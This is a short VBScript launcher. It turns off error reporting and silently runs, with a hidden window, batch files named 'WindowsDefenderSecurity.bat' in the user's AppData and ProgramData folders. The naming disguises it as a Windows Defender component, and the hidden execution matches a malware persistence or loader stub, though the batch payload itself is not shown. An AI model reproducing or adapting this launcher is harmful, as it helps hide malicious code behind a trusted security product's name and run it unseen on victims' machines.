On Error Resume Next
Set WshShell = WScript.CreateObject( "WScript.Shell" )
WshShell.Run "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.bat",0,True
WshShell.Run "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.bat",0,True